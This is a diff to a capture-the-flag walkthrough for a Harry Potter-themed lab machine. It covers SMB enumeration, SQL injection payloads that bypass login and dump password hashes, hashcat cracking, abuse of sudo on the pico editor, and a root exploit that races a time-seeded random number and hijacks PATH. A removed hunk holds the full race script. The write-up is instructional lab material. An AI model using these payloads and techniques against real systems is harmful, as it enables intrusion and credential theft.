@@ -15,7 +15,7 @@ Before initiating the engagement, the target IP was mapped to local hostnames to
 10.129.164.205 madeye.lab
 ```
 
-![](Screenshots/hosts-setup.png)
+![etc-hosts](Screenshots/etc-hosts.png)
 
 ---
 
@@ -27,7 +27,7 @@ A comprehensive TCP port scan was performed across all 65535 ports to identify a
 nmap 10.129.164.205 -p- --min-rate 500 -sC -sV -o ports.txt
 ```
 
-![](Screenshots/nmap-full-scan.png)
+![nmap-full-scan](Screenshots/nmap.png)
 
 The scan revealed the following open ports and services:
 
@@ -50,7 +50,7 @@ Given the presence of Samba SMB services (ports 139 and 445), initial enumeratio
 smbclient -L madeye.lab
 ```
 
-![](Screenshots/smbclient-list.png)
+![smbclient-list](Screenshots/smbclient-L.png)
 
 Three accessible shares were enumerated:
 
@@ -64,7 +64,9 @@ Connection to the **sambashare** was established without authentication:
 smbclient //madeye.lab/sambashare -N
 ```
 
-![](Screenshots/smbclient-connected.png)
+![smbclient-connected](Screenshots/smbclient-N.png)
+
+![smb-file-extraction](Screenshots/smb-get.png)
 
 Two files were discovered within the share:
 
@@ -87,7 +89,7 @@ Analysis of the extracted files revealed:
 - References to virtual hosting and domain registration
 - Explicit mention of domain: **hogwartz-castle.thm**
 
-![](Screenshots/notes-content.png)
+![smb-file-contents](Screenshots/notes-spellnames.png)
 
 **Key Finding:** The email conversation explicitly states that a custom domain (`hogwartz-castle.thm`) was registered for the target machine and that Apache is configured with virtual hosting capabilities. This strongly suggests the web server may serve different content based on the Host header.
 
@@ -107,7 +109,7 @@ To test this hypothesis, `/etc/hosts` was updated to include the discovered doma
 
 Accessing the application via the custom domain revealed a login interface:
 
-![](Screenshots/hogwartz-login-page.png)
+![hogwartz-login](Screenshots/login-page.png)
 
 **Interface Details:**
 - Custom login form with username and password fields
@@ -128,7 +130,7 @@ A basic SQL injection payload was submitted in the username field:
 ' OR 2=2--
 ```
 
-![](Screenshots/sqli-basic-payload.png)
+![sqli-basic-payload](Screenshots/found-sqli.png)
 
 **Response received:**
 
@@ -154,10 +156,16 @@ The error message indicates that while the authentication query was compromised,
 To extract database contents, a UNION-based SQL injection attack was employed. The payload was crafted to determine the number of columns returned by the original query:
 
 ```
-' UNION SELECT 1,2,3,4--
+' UNION SELECT NULL,NULL,NULL,NULL--
 ```
 
-![](Screenshots/sqli-union-columns.png)
+![sqli-null-test](Screenshots/SQLi-NULL-none.png)
+
+```
+' UNION SELECT 'A','B','C','D'--
+```
+
+![sqli-column-detection](Screenshots/SQLi-important-columns.png)
 
 The response indicated the query returns **4 columns**, with columns 1 and 4 being reflected in the error message.
 
@@ -166,11 +174,12 @@ The response indicated the query returns **4 columns**, with columns 1 and 4 bei
 To determine which database system is in use, SQL commands specific to each platform were tested:
 
 **For SQLite:**
+
 ```
 ' UNION SELECT 1,2,3,sqlite_version()--
 ```
 
-![](Screenshots/sqli-sqlite-version.png)
+![sqlite-version-check](Screenshots/SQLite-version.png)
 
 **Result:** SQLite version 3.31.1 confirmed.
 
@@ -184,7 +193,7 @@ With the database type identified, the schema was extracted using SQLite's metad
 ' UNION SELECT 1,2,3,sql FROM sqlite_master--
 ```
 
-![](Screenshots/sqli-schema-extraction.png)
+![schema-extraction](Screenshots/SQLite-master.png)
 
 **Extracted Schema:**
 
@@ -221,7 +230,7 @@ Given the reflected columns (1 and 4), credentials were concatenated for extract
 ' UNION SELECT 1,2,3,group_concat(name||':'||password) FROM users--
 ```
 
-![](Screenshots/sqli-credentials-raw.png)
+![credentials-extraction](Screenshots/SQLi-firstcredentials.png)
 
 The output was processed and formatted for analysis. All 40 username-password hash pairs were extracted.
 
@@ -233,13 +242,21 @@ The `notes` field often contains valuable metadata. A second query was executed 
 ' UNION SELECT 1,2,3,group_concat(name||':'||password||':'||admin||':'||notes) FROM users--
 ```
 
+![full-credentials-extraction](Screenshots/SQLi-get-all-credentials.png)
+
+Process to clean this output:
+
+![credential-cleanup](Screenshots/process-clean.png)
+
 **Critical Finding from Notes:**
+
+![notes-metadata-1](Screenshots/Notes-in-credentials.png)
+
+![notes-metadata-2](Screenshots/notes-in-credentials2.png)
 
 Within the extracted data, a note for user **Harry Turner** stated:
 
 > "My Linux username is Harry"
-
-![](Screenshots/sqli-harry-notes.png)
 
 This directly mapped the web application user to a system-level username, providing a significant advantage for subsequent exploitation stages.
 
@@ -249,11 +266,13 @@ This directly mapped the web application user to a system-level username, provid
 
 ### Hash Analysis
 
-The extracted password hash for Harry Turner was identified as a 64-character hexadecimal string, consistent with SHA-512 hashing. However, further analysis revealed it matched the format of a different hash algorithm.
+The extracted password hash for Harry Turner was identified as a 64-character hexadecimal string, consistent with SHA-512 hashing.
 
 Analysis confirmed the hash format as **SHA-512 (mode 1700 in hashcat)**.
 
 ### Hash Cracking Execution
+
+![harry-hash-extracted](Screenshots/hash.png)
 
 Using hashcat with the `best64.rule` ruleset (which applies statistically common password transformations):
 
@@ -262,9 +281,10 @@ hashcat -m 1700 -a 0 -r /usr/share/john/rules/best64.rule harryhash.txt \
   /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
-![](Screenshots/hashcat-cracking.png)
+![hash-cracking-result](Screenshots/hash-redacted.png)
 
-**Result:** 
+**Result:**
+
 ```
 Harry:[REDACTED_PASSWORD]
 ```
@@ -281,7 +301,7 @@ With valid credentials obtained, SSH access was established:
 ssh harry@madeye.lab
 ```
 
-![](Screenshots/ssh-login.png)
+![ssh-login](Screenshots/ssh.png)
 
 **System Information Captured:**
 - Last login: Tue Aug 18 11:23:38 2026 from 192.168.152.68
@@ -298,7 +318,7 @@ ls -la
 cat user1.txt
 ```
 
-![](Screenshots/user-flag.png)
+![user-flag-retrieval](Screenshots/flag1.png)
 
 **User flag captured:** `RME{th}`
 
@@ -314,16 +334,16 @@ After gaining SSH access as Harry, sudo permissions were checked:
 sudo -l
 ```
 
-![](Screenshots/sudo-permissions.png)
+![sudo-permissions](Screenshots/sudo-l.png)
 
 **Key Finding:**
 
 ```
 User harry may run the following commands on ip-10-129-133-8:
-    (hermoine) /usr/bin/pico
+    (hermonine) /usr/bin/pico
 ```
 
-Harry is permitted to execute the Pico text editor (`/usr/bin/pico`) with the privileges of user **hermoine** (note: likely a misspelling of "Hermione" from Harry Potter).
+Harry is permitted to execute the Pico text editor (`/usr/bin/pico`) with the privileges of user **hermonine** (note: likely a misspelling of "Hermione" from Harry Potter).
 
 ### Understanding Pico
 
@@ -331,41 +351,50 @@ Pico is a legacy text editor, a predecessor to Nano. On modern systems, the `pic
 
 **Exploitation Strategy:**
 
-While Pico itself cannot directly escalate privileges, it runs with hermoine's permissions. By using Pico's file reading capabilities (`Ctrl+R` — Read File), arbitrary files accessible to hermoine can be read.
+While Pico itself cannot directly escalate privileges, it runs with hermonine's permissions. By using Pico's file reading capabilities (`Ctrl+R` — Read File), arbitrary files accessible to hermonine can be read. However, executing from a restricted directory (like Harry's home) may result in permission errors. To avoid this, the editor should be invoked from a neutral directory such as `/home/`:
+
+```bash
+cd /home
+sudo -u hermonine /usr/bin/pico
+```
+
+But before proceeding, to avoid terminal-related issues, let's first use a script to establish a fully interactive and functional shell, as this may cause problems when executing `pico` as Hermione.
+
+![full-tty-shell](full-tty.png)
 
 ### File System Exploration via Pico
 
-The editor was invoked with hermoine's privileges:
+The editor was invoked with hermonine's privileges:
 
-```bash
-sudo -u hermoine /usr/bin/pico
-```
+![pico-startup](Screenshots/sudo-hermonine.png)
 
-![](Screenshots/pico-open.png)
+![pico-read-file](Screenshots/open-pico-read-file.png)
 
 Using the "Read File" feature (`Ctrl+R`), the home directory structure was enumerated:
 
 ```
 DIR: /home/
-..  (parent dir)  harry  (dir)  hermoine  (dir)  ubuntu  (dir)
+..  (parent dir)  harry  (dir)  hermonine  (dir)  ubuntu  (dir)
 ```
 
-Navigation to hermoine's home directory revealed:
+Navigation to hermonine's home directory revealed:
 
 ```
-DIR: /home/hermoine/
+DIR: /home/hermonine/
 .cache (dir)  .gnupg (dir)  .local (dir)  .ssh (dir)  .bash_logout  .bashrc  .profile  .bash_history
 ```
 
-### User Flag — Hermoine
+### User Flag — Hermonine
 
-Within hermoine's home directory, a second user flag was located:
+Within hermonine's home directory, a second user flag was located:
 
 ```
-user2.txt  [45 B]
+user2.txt
 ```
 
-![](Screenshots/hermoine-flag.png)
+![hermonine-home-directory](Screenshots/flag2.png)
+
+![hermonine-flag-extraction](Screenshots/get-flag2.png)
 
 This flag was extracted using Pico's file reading capability.
 
@@ -381,9 +410,9 @@ To identify potential privilege escalation vectors, SUID binaries were enumerate
 find / -type f -perm -4000 2>/dev/null
 ```
 
-![](Screenshots/suid-enumeration.png)
-
 Among standard system binaries, one suspicious custom binary was identified:
+
+![suid-enumeration](Screenshots/find-perm4000.png)
 
 ```
 /srv/time-turner/swagger
@@ -413,14 +442,13 @@ Upon execution, the binary prompts for numeric input:
 /srv/time-turner/swagger
 ```
 
-```
-Guess my number:
-1
-Nope, that is not what I was thinking
-I was thinking of 184584698
-```
+![swagger-execution](Screenshots/how-swagger-work.png)
 
-![](Screenshots/swagger-execution.png)
+The binary generates a different number each time it is executed. However, upon further investigation, it became apparent that the random number is generated based on the current Unix timestamp. This means all invocations within the same second produce identical numbers, making the randomness predictable.
+
+This vulnerability can be exploited using a bash script that synchronizes execution to second boundaries:
+
+![prng-bypass-script](Screenshots/basic-script-test.png)
 
 **Program Flow Reconstruction (via strings and assembly analysis):**
 
@@ -460,61 +488,19 @@ The random number generator uses only the current second as a seed. All invocati
 
 A bash script was created to exploit this timing vulnerability:
 
-```bash
-#!/bin/bash
-
-BIN="/srv/time-turner/swagger"
-
-while true; do
-    old=$(date +%s)
-    
-    # Wait for second boundary
-    while [[ "$(date +%s)" == "$old" ]]; do
-        :
-    done
-    
-    echo "$(date +%s)"
-    
-    # Capture the generated number from the binary
-    output=$("$BIN" <<< 0)
-    number=$(echo "$output" | awk '/I was thinking of/ {print $NF}')
-    
-    if [[ -z "$number" ]]; then
-        continue
-    fi
-    
-    echo "[+] rand() = $number"
-    
-    # Execute binary again in the same second with the correct guess
-    result=$("$BIN" <<< "$number")
-    echo "$result"
-    
-    if ! echo "$result" | grep -q "Nope"; then
-        echo "GOTCHA"
-        break
-    fi
-done
-```
-
-![](Screenshots/exploit-script.png)
+![exploit-script](Screenshots/script-test-sh.png)
 
 ### Initial Exploitation Confirmation
 
-The script was executed with a proof-of-concept payload to verify privilege escalation:
+The script was executed to verify privilege escalation:
 
 ```bash
-./exploit.sh
+./tmp/test.sh
 ```
 
-**Initial Output:**
+**Output:**
 
-```
-[+] Novo segundo: 1787053422
-[+] rand() = 2087988490
-Guess my number: Nice use of the time-turner!
-This system architecture is x86_64
-GOTCHA
-```
+![swagger-bypass-success](Screenshots/bypass-swagger.png)
 
 The binary executed successfully, confirming root privilege context.
 
@@ -580,39 +566,27 @@ export PATH=/tmp:$PATH
 
 Executing the exploit script triggered the custom `id` command:
 
-```
-This system architecture is uid=0(root) gid=0(root) groups=0(root),1001(harry)
-GOTCHA
-```
+![root-context-confirmation](Screenshots/prof-root.png)
 
 This confirmed that arbitrary commands execute with root privileges when `system()` calls them.
 
-### Root Shell Acquisition
+### Root Flag Retrieval
 
-The payload was upgraded to provide an interactive shell:
+The payload was upgraded to list the root directory:
 
 ```bash
 #!/bin/sh
-exec /bin/bash
+ls -ls /root
 ```
 
-Executing the exploit script delivered a root shell:
+![root-directory-listing](Screenshots/found-rootflag.png)
+
+The final payload was used to retrieve the root flag:
 
 ```bash
-./exploit.sh
-```
-
-![](Screenshots/root-shell-acquisition.png)
-
-### Root Flag Retrieval
-
-With root access established, the root flag was retrieved:
-
-```bash
+#!/bin/sh
 cat /root/root.txt
 ```
-
-![](Screenshots/root-flag.png)
 
 **Root flag captured:** `RME{root}`
 
@@ -620,32 +594,32 @@ cat /root/root.txt
 
 ## Attack Chain Summary
 
-| Step | Description | Technique |
+| Step | Description                                                        | Technique |
 |------|-------------|-----------|
-| 01 | Network reconnaissance performed across all 65535 TCP ports | Nmap full port scan |
-| 02 | SMB enumeration identified accessible shares | smbclient enumeration |
-| 03 | User comments extracted from SMB share revealing virtual host | Information disclosure |
-| 04 | Virtual host `hogwartz-castle.thm` added to /etc/hosts | DNS manipulation |
-| 05 | Login application accessed via custom domain | Virtual host discovery |
-| 06 | SQL injection payload bypassed authentication check | SQLi - OR-based payload |
-| 07 | Database type identified as SQLite 3.31.1 | UNION-based schema extraction |
-| 08 | Table structure determined: users(name, password, admin, notes) | SQL schema enumeration |
-| 09 | 40 user credentials extracted from database | UNION-based data extraction |
-| 10 | Harry Turner's notes revealed Linux username | Information disclosure via SQLi |
-| 11 | SHA-512 password hash cracked using hashcat + best64 rules | Offline password cracking |
-| 12 | SSH access obtained as user Harry | SSH authentication |
-| 13 | User flag retrieved from Harry's home directory | Flag capture |
-| 14 | Sudo permissions enumerated: `(hermoine) /usr/bin/pico` | Privilege escalal enumeration |
-| 15 | Pico editor invoked with hermoine privileges for file reading | Text editor abuse |
-| 16 | Hermoine's home directory traversed via Pico | File system traversal |
-| 17 | Second user flag extracted from hermoine's home | Flag capture |
-| 18 | SUID binary found: /srv/time-turner/swagger | SUID enumeration |
-| 19 | Binary behavior analyzed: weak PRNG seeding with time(NULL) | Reverse engineering |
-| 20 | Race condition exploited to predict PRNG output | Timing attack |
+| 01 | Network reconnaissance performed across all 65535 TCP ports        | Nmap full port scan |
+| 02 | SMB enumeration identified accessible shares                       | smbclient enumeration |
+| 03 | User comments extracted from SMB share revealing virtual host      | Information disclosure |
+| 04 | Virtual host `hogwartz-castle.thm` added to /etc/hosts             | DNS manipulation |
+| 05 | Login application accessed via custom domain                       | Virtual host discovery |
+| 06 | SQL injection payload bypassed authentication check                | SQLi - OR-based payload |
+| 07 | Database type identified as SQLite 3.31.1                          | UNION-based schema extraction |
+| 08 | Table structure determined: users(name, password, admin, notes)    | SQL schema enumeration |
+| 09 | 40 user credentials extracted from database                        | UNION-based data extraction |
+| 10 | Harry Turner's notes revealed Linux username                       | Information disclosure via SQLi |
+| 11 | SHA-512 password hash cracked using hashcat + best64 rules         | Offline password cracking |
+| 12 | SSH access obtained as user Harry                                  | SSH authentication |
+| 13 | User flag retrieved from Harry's home directory                    | Flag capture |
+| 14 | Sudo permissions enumerated: `(hermonine) /usr/bin/pico`           | Privilege escalation enumeration |
+| 15 | Pico editor invoked with hermonine privileges for file reading     | Text editor abuse |
+| 16 | Hermonine's home directory traversed via Pico                      | File system traversal |
+| 17 | Second user flag extracted from hermonine's home                   | Flag capture |
+| 18 | SUID binary found: /srv/time-turner/swagger                        | SUID enumeration |
+| 19 | Binary behavior analyzed: weak PRNG seeding with time(NULL)        | Reverse engineering |
+| 20 | Race condition exploited to predict PRNG output                    | Timing attack |
 | 21 | Correct number provided within same second to trigger root context | PRNG exploitation |
-| 22 | PATH variable manipulated to hijack system() calls | Command injection via PATH |
-| 23 | Root shell obtained via custom uname binary in /tmp | Privilege escalation to root |
-| 24 | Root flag retrieved from /root/root.txt | Flag capture |
+| 22 | PATH variable manipulated to hijack system() calls                 | Command injection via PATH |
+| 23 | Root shell obtained via custom uname binary in /tmp                | Privilege escalation to root |
+| 24 | Root flag retrieved from /root/root.txt                            | Flag capture |
 
 ---
 
@@ -699,4 +673,4 @@ cat /root/root.txt
 
 ---
 
-> Made by [Your Name](https://github.com/username) | For educational purposes only
+> Made by NonamesecX | For educational purposes only
